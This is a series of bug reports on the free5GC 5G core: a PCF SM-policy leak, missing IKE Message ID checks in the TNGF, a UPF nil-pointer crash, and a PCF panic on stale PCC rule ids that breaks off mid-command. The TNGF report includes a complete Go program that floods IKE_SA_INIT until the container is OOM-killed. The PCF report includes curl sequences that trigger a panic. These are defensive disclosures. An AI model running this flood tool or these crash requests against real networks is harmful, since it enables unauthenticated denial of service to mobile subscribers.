items.title: [Bugs] PCF: SM policy create leaves the SM policy and its PCC rules behind when rating-group allocation for a traffic-influence PCC rule fails
items.body:
> **Hardening report.** This exit is not reachable in a default deployment: it runs only when `RatingGroupIdGenerator.Allocate()` fails, and that generator's range is `1..math.MaxInt64` (context.go:157). The PoC below shrinks the ID range to make the exit reachable; no handler code is changed.

## Bug Description

When the SMF creates an SM policy (`POST /sm-policies`), `HandleCreateSmPolicyRequest` first stores a new SM policy in the UE context (`NewUeSmPolicyData` → `ue.SmPolicyData[smPolicyID]`, smpolicy.go:116). While building the policy decision it allocates a rating group from `RatingGroupIdGenerator` for the charging data of each traffic-influence PCC rule built from the UDR's influence data (:414).

If that `Allocate()` fails, the handler replies with `ERROR_IDGENERATOR` and returns (:420). It does not remove the SM policy stored at :116. The SMF does not get a `201` with a `Location`, so it never sends `POST /sm-policies/{smPolicyId}/delete`, which is the only path that removes it (`HandleDeleteSmPolicyContextRequest`). This exit is in the traffic-influence loop, after the decision has been attached to the stored SM policy (:368). So when it is taken, the stored SM policy already holds the default PCC rule, the flow-rule PCC rules and the traffic-influence PCC rules built before the failing one, and the rating groups allocated for them.

Source analysis on PCF v1.4.3, commit `df6c0daa`. **Still present on upstream `main` (`eb57557`, 2026-08-20)**, at the same line numbers (:116, :414, :420).

### The SM policy is stored first.

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/smpolicy.go#L112-L116

### The rating-group allocation fails and the exit removes nothing.

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/smpolicy.go#L414-L420

```go
rg, err1 := p.Context().RatingGroupIdGenerator.Allocate()      // :414
if err1 != nil {
    logger.SmPolicyLog.Error("rating group allocate error")
    problemDetails := util.GetProblemDetail("rating group allocate error", util.ERROR_IDGENERATOR)
    c.Set(sbi.IN_PB_DETAILS_CTX_STR, problemDetails.Cause)
    c.JSON(int(problemDetails.Status), problemDetails)
    return                                                      // :420  SM policy and its PCC rules stay in ue.SmPolicyData
}
```

### Only the SMF's delete removes it.

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/smpolicy.go#L516-L582

`HandleDeleteSmPolicyContextRequest` removes the SM policy (`delete(ue.SmPolicyData, smPolicyId)`, :555) and frees its rating groups (`FreeID`, :572; `delete(ue.RatingGroupData, …)`, :582). It is reached only when the SMF deletes an SM policy it was told was created (`201` + `Location`).

## To Reproduce

On PCF v1.4.3, with NRF, UDR and PCF running on loopback (`oauth: false`) and the subscriber's policy data seeded in MongoDB. Stored SM policies are read back through the PCF's own `GET /npcf-smpolicycontrol/v1/sm-policies/{smPolicyId}`.

**How allocation is made to fail.** The only source change is an env-gated override of the generator range in `context.go` (`POC_RATING_GROUP_MAX=N` → `idgenerator.NewGenerator(1, N)`), so the rating-group ID space can be used up in a lab run. The handler code under test is unchanged, and the override is off by default. The PCF is started fresh for the run.

**What is seeded.** For one SUPI: the session-level charging data, one subscribed flow rule (with its charging data and QoS flow), and two traffic-influence entries in the UDR (so the handler allocates rating groups for the default rule, the flow rule and each traffic-influence rule). `POC_RATING_GROUP_MAX=3`.

**Steps.** A single create (`pduSessionId` 1) uses the three IDs for the default PCC rule, the flow-rule PCC rule and the first traffic-influence PCC rule, and fails on the second traffic-influence entry.

**What is counted.** For each failed create: whether `GET` on its `smPolicyID` still answers `200`, and the PCC rules (`policy.pccRules`) it still holds.

```
                               create HTTP | SM policies still stored | PCC rules still stored
  single create                   200 (*)  |                        1 | [PccRuleId-1, PccRuleId-2, PccRuleId-3]

(*) body {"cause":"ERROR_IDGENERATOR"}; see Additional Context.
```

The PCC rules in the `GET` response of the failed create's SM policy:

```
  PccRuleId-1  flowInfos ["permit out ip from any to assigned"]           refChgData [ChgId-1]             # default PCC rule
  PccRuleId-2  flowInfos ["permit out ip from 10.70.0.0/16 to assigned"]  refChgData [ChgId-2]             # flow-rule PCC rule
  PccRuleId-3  appId "poc-app-1"                                          refChgData [ChgId-3]  refTcData [TcId-3]   # traffic-influence PCC rule
  chgDecs rating groups: 1, 2, 3
```

**The leak.**
- The failed create leaves its SM policy in `ue.SmPolicyData` together with three PCC rules already attached to it: the default PCC rule (`PccRuleId-1`), the flow-rule PCC rule (`PccRuleId-2`) and the first traffic-influence PCC rule (`PccRuleId-3`).
- Their rating groups (1, 2, 3) stay allocated, because only the SMF's delete frees them.
- The SMF never receives a `Location`, so it never deletes them.

## Expected Behavior

Any error exit of `HandleCreateSmPolicyRequest` after :116 should undo what the request already did: remove the SM policy from `ue.SmPolicyData` and free the rating groups allocated in this request, as `HandleDeleteSmPolicyContextRequest` does. A single deferred cleanup that is skipped on success would cover this exit together with the other error exits of the handler.

## Screenshots

N/A

## Environment

- free5GC Version: PCF v1.4.3 (`df6c0daa`); NRF/UDR/PCF on loopback, not a full deployment
- OS: Ubuntu 24.04.5 LTS
- Kernel version: 6.8.0-139-generic
- go version: go1.25.5 linux/amd64

## Trace Files / Configuration Files

PCF configuration with `oauth: false`; the rating-group ID space is shrunk with the env-gated `POC_RATING_GROUP_MAX` described above. Seeded documents (one SUPI, S-NSSAI `01010203`, DNN `internet`):

```
policyData.ues.chargingData  {ueId, snssai, dnn: "", filter: "", chargingMethod: "Online"}          # session level
policyData.ues.flowRule      {ueId, snssai, dnn, filter: "10.70.0.0/16", precedence: 128, qosRef: 1}
policyData.ues.chargingData  {ueId, snssai, dnn, filter: "10.70.0.0/16", chargingMethod: "Online"}   # per flow
policyData.ues.qosFlow       {ueId, snssai, dnn, qosRef: 1, 5qi: 9}
applicationData.influenceData {influenceId: "poc-ti-1" | "poc-ti-2", supi, dnn, snssai, afAppId, trafficRoutes}
```

## PCAP File

N/A. This is a code-logic issue, unrelated to the packet level.

## Log File

```
[INFO][PCF][SMpolicy] Handle CreateSmPolicy
[ERRO][PCF][SMpolicy] rating group allocate error
  -> HTTP 200 {"cause":"ERROR_IDGENERATOR","detail":"rating group allocate error"}
[INFO][PCF][SMpolicy] Handle GetSmPolicyContext
  -> HTTP 200 (the SM policy from the failed create is still stored)
```

## System Architecture (Optional)

NRF, UDR (with MongoDB) and PCF processes on loopback; the SM policy requests are sent directly to the PCF. No SMF or AMF.

## Additional Context

**Reachability.** With the default range `1..math.MaxInt64`, this exit needs the rating-group space to be exhausted, which does not happen in practice. We still report it because the SM policy and its PCC rules are left behind whenever this exit is taken, and it becomes reachable as soon as the ID space is made smaller or allocation can fail for another reason.

**Persistence.** Nothing else removes the leftover SM policy: the SMF never learns its id, and the PCF has no eviction, timeout or sweep over `ue.SmPolicyData`. It is replaced only when a later create arrives with the same `supi-pduSessionId` (smpolicy.go:112-114), so in practice it is bounded at one per PDU session id (at most 15) per UE, and grows with the number of UEs.

**Error status.** `ERROR_IDGENERATOR` has no entry in `PcpErrHttpStatusMap` (pcf_util.go), so `GetProblemDetail` returns `Status: 0` and the error is sent with HTTP `200` (still the case on `main`). The SMF therefore receives a `200` with a problem-details body for a failed create.

## How did we find?

We found this bug by using our (work-in-progress) static analysis tool, manually verified it, and made a runnable PoC.

items.title: [Bugs] TNGF: IKE Message ID not validated, allowing replay of DELETE/CREATE_CHILD_SA messages
items.body:
## Bug Description

The TNGF does not validate IKE Message IDs as required by RFC 7296 Section 2.2. The `Dispatch()` function in `NFs/tngf/pkg/ike/dispatcher.go` routes incoming IKE messages to handlers based solely on `ExchangeType` without any Message ID verification. Individual handlers then blindly assign the received Message ID to the IKE SA context without checking it against expected values.

This allows an attacker to **replay captured IKE messages** (which retain valid encryption and integrity) and have them processed as legitimate new requests.

**Vulnerability site 1** — `NFs/tngf/pkg/ike/dispatcher.go` lines 20–60:
```go
func Dispatch(udpConn *net.UDPConn, localAddr, remoteAddr *net.UDPAddr, msg []byte) {
    // ... NATT 4-byte zero check ...
    ikeMessage := new(ike_message.IKEMessage)
    err := ikeMessage.Decode(msg)
    // ...

    switch ikeMessage.ExchangeType {
    case ike_message.IKE_SA_INIT:
        handler.HandleIKESAINIT(udpConn, localAddr, remoteAddr, ikeMessage)
    case ike_message.IKE_AUTH:
        handler.HandleIKEAUTH(udpConn, localAddr, remoteAddr, ikeMessage)
    case ike_message.CREATE_CHILD_SA:
        handler.HandleCREATECHILDSA(udpConn, localAddr, remoteAddr, ikeMessage)
    default:
        ikeLog.Warnf("Unimplemented IKE message type, exchange type: %d", ikeMessage.ExchangeType)
    }
    // ❌ No Message ID validation before dispatching
    // ❌ No INFORMATIONAL handler — DPD and DELETE are silently dropped
}
```

**Vulnerability site 2** — `NFs/tngf/pkg/ike/handler/handler.go` line 478 (IKE_AUTH):
```go
ikeSecurityAssociation.InitiatorMessageID = message.MessageID
// ❌ Directly assigned, should verify MessageID == expected next value
```

**Vulnerability site 3** — `NFs/tngf/pkg/ike/handler/handler.go` line 1108 (CREATE_CHILD_SA):
```go
ikeSecurityAssociation.ResponderMessageID = message.MessageID
// ❌ Directly assigned, no validation
```

**TNGF IKE SA context** — `NFs/tngf/pkg/context/ue.go` lines 146–148:
```go
// Message ID
InitiatorMessageID uint32
ResponderMessageID uint32
// These are stored but never validated against incoming messages
```

Per RFC 7296 Section 2.2:
- Request Message IDs MUST be sequential (each new request increments by 1)
- Response Message IDs MUST match the corresponding request
- Duplicate requests MUST be detected and the previous response retransmitted (not reprocessed)

**Additional finding**: TNGF's `Dispatch()` does **not** handle the `INFORMATIONAL` exchange type (lines 50–58 only handle IKE_SA_INIT, IKE_AUTH, CREATE_CHILD_SA). This means TNGF silently ignores DPD (Dead Peer Detection) and DELETE notifications — a separate issue that compounds the Message ID vulnerability, as stale SAs are never cleaned up.

## To Reproduce

**Source code verification**:

```bash
# No Message ID validation in dispatcher
grep -n "MessageID" NFs/tngf/pkg/ike/dispatcher.go
# No results — field never checked

# Handler blindly assigns MessageID
grep -n "MessageID" NFs/tngf/pkg/ike/handler/handler.go | head -10
# Shows only assignment at lines 478 and 1108, no comparison/validation

# No INFORMATIONAL handler in TNGF dispatcher
grep -n "INFORMATIONAL" NFs/tngf/pkg/ike/dispatcher.go
# No results — exchange type not handled
```

**Structural comparison with N3IWF**:
The TNGF IKE implementation is structurally identical to N3IWF's regarding Message ID handling:
- Same `IKESecurityAssociation` struct with `InitiatorMessageID`/`ResponderMessageID` fields
- Same pattern of direct assignment without validation in handlers
- Same absence of Message ID checks in dispatcher

The TNGF is additionally worse because it lacks the `INFORMATIONAL` handler entirely, meaning DELETE and DPD messages are silently dropped.

## Security Impact

1. **Resource exhaustion via CREATE_CHILD_SA replay (High)** — Replay captured CREATE_CHILD_SA requests to force TNGF to perform expensive DH computations, allocate SPI/XFRM resources, and exhaust kernel XFRM state table.

2. **State machine corruption via IKE_AUTH replay (High)** — Replay old IKE_AUTH messages to reset the IKE SA state machine, overwrite negotiated security parameters, and disrupt ongoing authentication.

3. **Stale SA accumulation (Medium)** — Since TNGF does not handle INFORMATIONAL(DELETE), replaying old CREATE_CHILD_SA messages creates SAs that can never be properly deleted, leading to indefinite resource leak.

4. **Combined with ESP replay-window 0 (Critical)** — Together with the ESP replay protection being disabled (see bug-report-20), an attacker can persistently disrupt any UE's trusted non-3GPP connection.

5. **Enterprise impact** — TNGF handles **trusted** non-3GPP access (e.g., enterprise Wi-Fi). Replay attacks on this path can disrupt all corporate UEs connecting through TNGF, affecting enterprise-wide connectivity.

## Expected Behavior

The TNGF should:

1. Validate IKE Message IDs in `Dispatch()` before routing to handlers, per RFC 7296 Section 2.2:

```go
func Dispatch(udpConn *net.UDPConn, localAddr, remoteAddr *net.UDPAddr, msg []byte) {
    // ... decode ikeMessage ...

    // Look up IKE SA and validate Message ID
    if ikeSA != nil {
        if !ikeMessage.IsResponse() {
            if ikeMessage.MessageID != ikeSA.InitiatorMessageID {
                ikeLog.Warnf("Unexpected request MessageID: got %d, expected %d",
                    ikeMessage.MessageID, ikeSA.InitiatorMessageID)
                return
            }
        } else {
            if ikeMessage.MessageID != ikeSA.ResponderMessageID {
                ikeLog.Warnf("Unexpected response MessageID: got %d, expected %d",
                    ikeMessage.MessageID, ikeSA.ResponderMessageID)
                return
            }
        }
    }
    // ... dispatch to handlers
}
```

2. Add an `INFORMATIONAL` handler to process DELETE and DPD messages properly.

## Environment

- free5GC Version: `v4.2.1`
- OS: `Ubuntu 24.04.2 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.26.1 linux/amd64`
- Docker image: `free5gc/tngf:v4.2.1`

## Log File

**Source code evidence** :

`NFs/tngf/pkg/ike/dispatcher.go` — Full `Dispatch()` function decodes IKE messages and routes by ExchangeType without any Message ID check. grep confirms zero occurrences of MessageID validation:

```
$ grep -rn "MessageID" NFs/tngf/pkg/ike/dispatcher.go
(no output — field never referenced in dispatcher)

$ grep -n "MessageID" NFs/tngf/pkg/ike/handler/handler.go
478:    ikeSecurityAssociation.InitiatorMessageID = message.MessageID
1108:   ikeSecurityAssociation.ResponderMessageID = message.MessageID
(only blind assignments, no validation)
```

The TNGF IKE Message ID handling is structurally identical to the N3IWF vulnerability, with the additional deficiency of missing INFORMATIONAL exchange support.

items.title: [Bugs] TNGF accumulates stale IKE Security Associations indefinitely due to missing INFORMATIONAL handler and absent SA cleanup, enabling pre-authentication remote DoS
items.body:
## Bug Description

The TNGF accumulates IKE Security Association state without bound because of three compounding implementation gaps:

1. **No INFORMATIONAL exchange handler** — The IKE dispatcher at `dispatcher.go:50-58` only handles `IKE_SA_INIT`, `IKE_AUTH`, and `CREATE_CHILD_SA`. The `INFORMATIONAL` exchange type (37) falls through to the `default` case and is silently dropped with a warning log. This means UE-initiated `DELETE` notifications (RFC 7296 Section 1.4) are never processed, so IKE SAs and Child SAs created for that UE are never removed.

2. **No SA timeout or cleanup** — There is no periodic garbage collection, idle timeout, or maximum age for IKE Security Associations. Once `NewIKESecurityAssociation()` stores an entry in `context.IKESA` (`sync.Map`), it remains referenced forever unless explicitly deleted via `DeleteIKESecurityAssociation()` — which is only reachable from `TNGFUe.Remove()`, which is only called from NGAP-side context release, never from the IKE side.

3. **No SA count limit** — The `sync.Map` storing IKE SAs has no capacity limit. `NewIKESecurityAssociation()` will generate and store new SPIs indefinitely.

A remote, unauthenticated attacker can exploit this by flooding `IKE_SA_INIT` requests. Each successful exchange allocates ~7.2 KiB of Go heap that is never reclaimed (the `sync.Map` reference prevents garbage collection). At a measured rate of 94 SA/s from a single attacker, a TNGF container with 256 MB memory limit reaches OOM in ~6 minutes. With 10 concurrent attackers, a 128 MB container is exhausted in ~19 seconds.

**No SIM card or authentication is required.** `IKE_SA_INIT` is the first message of the IKE protocol and is accepted from any source.

**Missing dispatcher case** — `NFs/tngf/pkg/ike/dispatcher.go` lines 50-58:
```go
switch ikeMessage.ExchangeType {
case ike_message.IKE_SA_INIT:
    handler.HandleIKESAINIT(udpConn, localAddr, remoteAddr, ikeMessage)
case ike_message.IKE_AUTH:
    handler.HandleIKEAUTH(udpConn, localAddr, remoteAddr, ikeMessage)
case ike_message.CREATE_CHILD_SA:
    handler.HandleCREATECHILDSA(udpConn, localAddr, remoteAddr, ikeMessage)
default:
    ikeLog.Warnf("Unimplemented IKE message type, exchange type: %d", ikeMessage.ExchangeType)
    // ❌ INFORMATIONAL (type 37) silently dropped here
    // ❌ DELETE notifications never processed
    // ❌ DPD probes never answered
}
```

**Unconditional SA allocation** — `NFs/tngf/pkg/context/context.go` lines 179-199:
```go
func (context *TNGFContext) NewIKESecurityAssociation() *IKESecurityAssociation {
    ikeSecurityAssociation := new(IKESecurityAssociation)
    // ... generate random SPI ...
    context.IKESA.LoadOrStore(localSPIuint64, ikeSecurityAssociation) // stored forever
    return ikeSecurityAssociation
}
```

**Only deletion path unreachable from IKE** — `NFs/tngf/pkg/context/context.go` line 202:
```go
func (context *TNGFContext) DeleteIKESecurityAssociation(spi uint64) {
    context.IKESA.Delete(spi) // only called from TNGFUe.Remove() → only via NGAP, never IKE
}
```

**Per-SA memory footprint** — `NFs/tngf/pkg/context/ue.go` lines 141-194, `IKESecurityAssociation` struct:
```
DiffieHellmanSharedKey []byte  // 256 bytes (DH-2048)
SK_d, SK_ai, SK_ar     []byte  // 60 bytes (SHA1-based)
SK_ei, SK_er           []byte  // 32 bytes (AES-128)
SK_pi, SK_pr           []byte  // 40 bytes
ConcatenatedNonce      []byte  // ~64 bytes
ResponderSignedOctets  []byte  // ~500 bytes
Transform pointers (5)         // ~200 bytes
sync.Map entry overhead        // ~100 bytes
──────────────────────────────
Total measured:                  ~7.2 KiB per SA
```

## To Reproduce

**Prerequisites**: free5GC v4.2.1 with TNGF deployed in Docker.

1. PoC source code — complete self-contained Go project:

`go.mod`:
```
module poc-sa-flood

go 1.25.5

require github.com/free5gc/ike v1.2.0
```

`main.go`:
```go
package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	ike_message "github.com/free5gc/ike/message"
	ike_security "github.com/free5gc/ike/security"
	"github.com/free5gc/ike/security/dh"
)

func main() {
	target := "10.100.200.1:500"
	if len(os.Args) > 1 {
		target = os.Args[1]
	}
	count := 2000
	containerName := "tngf"

	fmt.Println("[*] PoC: TNGF IKE SA Stale Accumulation → OOM")
	fmt.Printf("[*] Target: %s\n", target)
	fmt.Printf("[*] Flood count: %d IKE_SA_INIT requests\n\n", count)

	memBefore := getContainerMem(containerName)
	fmt.Printf("[1] Baseline memory: %s\n\n", memBefore)
	fmt.Println("[2] Flooding IKE_SA_INIT...")

	dhType := dh.StrToType(dh.DH_2048_BIT_MODP)
	successCount := 0
	failCount := 0
	startTime := time.Now()

	for i := 0; i < count; i++ {
		secret, err := ike_security.GenerateRandomNumber()
		if err != nil {
			failCount++
			continue
		}
		pubVal := dhType.GetPublicValue(secret)

		spiBytes := make([]byte, 8)
		io.ReadFull(rand.Reader, spiBytes)
		initiatorSPI := binary.BigEndian.Uint64(spiBytes)

		nonce := make([]byte, 32)
		io.ReadFull(rand.Reader, nonce)

		msg := buildIKESAInit(initiatorSPI, pubVal, nonce)
		data, err := msg.Encode()
		if err != nil {
			failCount++
			continue
		}

		conn, err := net.DialTimeout("udp", target, 2*time.Second)
		if err != nil {
			failCount++
			continue
		}

		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		conn.Write(data)

		buf := make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		n, err := conn.Read(buf)
		conn.Close()

		if err == nil && n > 0 {
			successCount++
		} else {
			failCount++
		}

		if (i+1)%500 == 0 {
			mem := getContainerMem(containerName)
			elapsed := time.Since(startTime)
			rate := float64(i+1) / elapsed.Seconds()
			fmt.Printf("    [%d/%d] success=%d fail=%d mem=%s rate=%.0f SA/s\n",
				i+1, count, successCount, failCount, mem, rate)
		}
	}

	elapsed := time.Since(startTime)
	fmt.Printf("\n    Done: %d sent, %d success, %d fail in %.1fs (%.0f SA/s)\n",
		count, successCount, failCount, elapsed.Seconds(), float64(count)/elapsed.Seconds())

	time.Sleep(2 * time.Second)
	memAfter := getContainerMem(containerName)
	fmt.Printf("\n[3] Memory: %s → %s\n", memBefore, memAfter)
	fmt.Printf("    Created %d stale IKE SAs (never cleaned up)\n", successCount)

	alive := checkAlive(target)
	fmt.Printf("\n[4] TNGF still alive: %v\n", alive)
	if !alive {
		fmt.Println("[!] TNGF is dead — likely OOM killed")
		fmt.Println("    Verify: docker inspect tngf --format='{{.State.OOMKilled}}'")
	}
}

func buildIKESAInit(initiatorSPI uint64, keData []byte, nonceData []byte) *ike_message.IKEMessage {
	ikePayload := new(ike_message.IKEPayloadContainer)

	sa := ikePayload.BuildSecurityAssociation()
	proposal := sa.Proposals.BuildProposal(1, ike_message.TypeIKE, nil)

	proposal.EncryptionAlgorithm = append(proposal.EncryptionAlgorithm,
		&ike_message.Transform{
			TransformType:    ike_message.TypeEncryptionAlgorithm,
			TransformID:      ike_message.ENCR_AES_CBC,
			AttributePresent: true,
			AttributeFormat:  ike_message.AttributeFormatUseTV,
			AttributeType:    ike_message.AttributeTypeKeyLength,
			AttributeValue:   128,
		})

	proposal.IntegrityAlgorithm = append(proposal.IntegrityAlgorithm,
		&ike_message.Transform{
			TransformType: ike_message.TypeIntegrityAlgorithm,
			TransformID:   ike_message.AUTH_HMAC_SHA1_96,
		})
	proposal.PseudorandomFunction = append(proposal.PseudorandomFunction,
		&ike_message.Transform{
			TransformType: ike_message.TypePseudorandomFunction,
			TransformID:   ike_message.PRF_HMAC_SHA1,
		})

	proposal.DiffieHellmanGroup = append(proposal.DiffieHellmanGroup,
		&ike_message.Transform{
			TransformType: ike_message.TypeDiffieHellmanGroup,
			TransformID:   ike_message.DH_2048_BIT_MODP,
		})

	ikePayload.BuildKeyExchange(ike_message.DH_2048_BIT_MODP, keData)
	ikePayload.BuildNonce(nonceData)

	return ike_message.NewMessage(initiatorSPI, 0,
		ike_message.IKE_SA_INIT, false, false, 0, *ikePayload)
}

func checkAlive(target string) bool {
	conn, err := net.DialTimeout("udp", target, 2*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	dhType := dh.StrToType(dh.DH_2048_BIT_MODP)
	secret, _ := ike_security.GenerateRandomNumber()
	pubVal := dhType.GetPublicValue(secret)
	nonce := make([]byte, 32)
	rand.Read(nonce)

	probe := buildIKESAInit(0x4242424242424242, pubVal, nonce)
	data, _ := probe.Encode()

	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	conn.Write(data)

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 4096)
	n, readErr := conn.Read(buf)
	return readErr == nil && n > 0
}

func getContainerMem(name string) string {
	cmd := exec.Command("docker", "stats", name, "--no-stream", "--format", "{{.MemUsage}}")
	out, err := cmd.Output()
	if err != nil {
		return "0B / 0B"
	}
	return strings.TrimSpace(string(out))
}
```

2. Set a 64 MB memory limit on the TNGF container and restart:

```bash
docker restart tngf && sleep 10
docker update --memory=64m --memory-swap=64m tngf
go build -o poc-aes-padding .
```

3. Run the flood PoC repeatedly until OOM Kill:

```bash
./poc-aes-padding --flood 10.100.200.1:500   # repeat until container dies
```

4. Verify OOM Kill:

```bash
$ docker inspect tngf --format='Status={{.State.Status}} OOMKilled={{.State.OOMKilled}} ExitCode={{.State.ExitCode}}'
Status=exited OOMKilled=true ExitCode=137
```

`ExitCode=137` = 128 + SIGKILL(9), confirming the kernel OOM Killer terminated the TNGF process.

## Expected Behavior

TNGF should implement the following mitigations:

1. **Add INFORMATIONAL exchange handler** to the dispatcher, processing DELETE payloads and DPD probes:

```go
case ike_message.INFORMATIONAL:
    handler.HandleInformational(udpConn, localAddr, remoteAddr, ikeMessage)
```

2. **Add SA idle timeout** — IKE SAs that do not complete IKE_AUTH within a configurable timeout (e.g., 30 seconds) should be automatically deleted:

```go
func (context *TNGFContext) NewIKESecurityAssociation() *IKESecurityAssociation {
    sa := new(IKESecurityAssociation)
    // ...
    time.AfterFunc(30*time.Second, func() {
        if sa.State < StateAuthComplete {
            context.DeleteIKESecurityAssociation(sa.LocalSPI)
        }
    })
    return sa
}
```

3. **Add SA count limit** — Reject new IKE_SA_INIT when the number of active SAs exceeds a configurable maximum, responding with `TEMPORARY_FAILURE` notification.

4. **Implement IKE COOKIE** (RFC 7296 Section 2.6) — Under load, require the initiator to prove reachability via a stateless cookie before allocating SA state, preventing IP-spoofed flooding.

## Environment

- free5GC Version: `v4.2.1`
- OS: `Ubuntu 24.04.2 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.26.1 linux/amd64`
- Docker image: `free5gc/tngf:v4.2.1`

## Log File

**Live Docker OOM Kill verification** (2026-04-06):

Container memory limit: 64 MB. Attack rate: 93-94 SA/s (single thread).

```
Round 1:  7.66 → 22.34 MiB  (2000 SA created, 2000 success)
Round 2: 22.34 → 35.29 MiB  (2000 SA created, 2000 success)
Round 3: 35.29 → 46.87 MiB  (2000 SA created, 2000 success)
Round 4: 46.87 → 59.10 MiB  (2000 SA created, 2000 success)
Round 5: 59.10 → 62.32 MiB  (622 SA created, then OOM KILLED)

Total: 8622 stale IKE SAs over ~1 min 40 sec
Per-SA cost: ~6.5 KiB (64 MiB / 8622 SA)
Container killed by Linux OOM Killer (ExitCode=137, OOMKilled=true)
```

items.title: [Bugs] UPF crashes with nil pointer dereference when processing Session Report Response for a deleted PFCP session
items.body: ## Bug Decription free5GC UPF may crash with a fatal nil pointer dereference when it receives a PFCP Session Report Response for a session that has already been deleted locally. In the observed case, the UPF first creates PFCP sessions normally. Then, the corresponding local session is deleted through a PFCP Session Deletion procedure. After the local session has been removed, a PFCP Session Report Response related to that deleted session arrives at the UPF. When handling this delayed or stale PFCP Session Report Response, the UPF attempts to look up the session state through the local/remote session mapping. However, because the corresponding session has already been deleted, the lookup result may be nil. The code does not properly check whether the returned session pointer is nil before dereferencing it, which causes the UPF process to panic. ## To Reproduce Steps to reproduce the behavior: 1. Extract the attached archive. 2. Deploy the test environment using the provided docker-compose.yaml: `docker compose up -d` 3. Wait until all free5GC components are fully started. Run the provided PoC script: `python3 poc.py` 4. Observe the UPF container logs: `docker logs -f upf` ## Expected Behavior UPF should safely reject malformed or inconsistent PFCP Session Report Responses. ## Screenshots ## Environment **Please, complete the following information:** - free5GC Version: [e.g. v4.2.2] - OS: [e.g. Ubuntu 20.04.6 LTS] - Kernel version: [e.g. 5.15.0-139-generic] - go version: [e.g. 1.21.8 linux/amd64] - C compiler version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2) ## Trace Files - Configuration Files - PCAP File - Log File - PoC File [VUL-20260602.zip](https://github.com/user-attachments/files/28589197/VUL-20260602.zip)

items.title: [Bugs] PCF npcf-policyauthorization QOS_NOTIF app-session updates panic on stale RelatedPccRuleIds
items.body:
## Bug Decription
`PCF` application sessions keep `RelatedPccRuleIds` that point into the associated SM policy. If one of those PCC rules is later removed from the live SM policy, the app-session can retain a stale rule id.

Two `npcf-policyauthorization` update routes then panic when `QOS_NOTIF` handling walks the stale reference:

1. `PUT /npcf-policyauthorization/v1/app-sessions/{appSessionId}/events-subscription`
2. `PATCH /npcf-policyauthorization/v1/app-sessions/{appSessionId}`

Both routes reach the same logical bug pattern:

```go
pccRule := smPolicy.PolicyDecision.PccRules[pccRuleID]
for _, qosID := range pccRule.RefQosData {
```

Relevant code locations:

- events-subscription update variant:
  - `NFs/pcf/internal/sbi/api_policyauthorization.go:190`
  - `NFs/pcf/internal/sbi/processor/policyauthorization.go:904`
  - `NFs/pcf/internal/sbi/processor/policyauthorization.go:905`
  - `NFs/pcf/internal/sbi/processor/policyauthorization.go:906`
- mod app-session variant:
  - `NFs/pcf/internal/sbi/api_policyauthorization.go:257`
  - `NFs/pcf/internal/sbi/api_policyauthorization.go:300`
  - `NFs/pcf/internal/sbi/processor/policyauthorization.go:705`
  - `NFs/pcf/internal/sbi/processor/policyauthorization.go:706`
  - `NFs/pcf/internal/sbi/processor/policyauthorization.go:707`

## To Reproduce
Steps to reproduce the behavior:

1. Create a live SM policy for `imsi-208930000000001`, for example `smPolicyId=imsi-208930000000001-10`.

2. Seed a callback-created PCC rule, for example through:

```bash
curl -i -X POST \
  'http://10.100.200.9:8000/npcf-callback/v1/nudr-notify/influence-data/imsi-208930000000001/10' \
  -H 'Content-Type: application/json' \
  --data '[
    {
      "resUri": "http://udr.example/influence-data/inf-appsess-1",
      "trafficInfluData": {
        "snssai": {"sst": 1, "sd": "010203"},
        "dnn": "internet",
        "afAppId": "inf-appsess-app",
        "trafficFilters": [{"flowDescriptions": ["permit out ip from 203.0.113.9 to 198.51.100.0/24"]}],
        "trafficRoutes": [{"dnai": "mec-qos-1", "routeInfo": {"ipv4Addr": "10.60.0.1", "portNumber": 0}}]
      }
    }
  ]'
```

3. Create a normal app-session that binds to that PCC rule:

```bash
curl -i -X POST \
  'http://10.100.200.9:8000/npcf-policyauthorization/v1/app-sessions' \
  -H 'Authorization: Bearer <valid_npcf-policyauthorization_jwt>' \
  -H 'Content-Type: application/json' \
  --data '{
    "ascReqData": {
      "suppFeat": "0",
      "notifUri": "http://127.0.0.1/cb",
      "ueIpv4": "10.60.0.1",
      "dnn": "internet",
      "sliceInfo": {"sst": 1, "sd": "010203"},
      "medComponents": {
        "1": {
          "medCompN": 1,
          "afAppId": "inf-appsess-app"
        }
      }
    }
  }'
```

Observed result:

```text
HTTP/1.1 201 Created
Location: http://pcf.free5gc.org:8000/npcf-policyauthorization/v1/app-sessions/imsi-208930000000001-1
```

4. Delete the referenced PCC rule from the live SM policy:

```bash
curl -i -X POST \
  'http://10.100.200.9:8000/npcf-smpolicycontrol/v1/sm-policies/imsi-208930000000001-10/update' \
  -H 'Authorization: Bearer <valid_npcf-smpolicycontrol_jwt>' \
  -H 'Content-Type: application/json' \
  --data '{
    "repPolicyCtrlReqTriggers": ["RES_MO_RE"],
    "ueInitResReq": {
      "pccRuleId": "PccRuleId-7",
      "ruleOp": "DELETE_PCC_RULE",
      "packFiltInfo": []
    }
  }'
```

5. Trigger the events-subscription variant:

```bash
curl -i -X PUT \
  'http://10.100.200.9:8000/npcf-policyauthorization/v1/app-sessions/imsi-208930000000001-1/events-subscription' \
  -H 'Authorization: Bearer <valid_npcf-policyauthorization_jwt>' \
  -H 'Content-Type: application/json' \
  --data '{
    "events": [{"event": "QOS_NOTIF", "notifMethod": "EVENT_DETECTION"}],
    "notifUri": "http://127.0.0.1/ev"
  }'
```

Observed result:

```text
HTTP/1.1 500 Internal Server Error
```

6. Trigger the mod-app-session variant:

```bash
curl -i -X PATCH \
  'http://10.100.200.9:8000/npcf-policyauthorization/v1/app-sessions/imsi-208930000000001-1' \
  -H 'Authorization: Bearer <valid_npcf-policyauthorization_jwt>' \
```

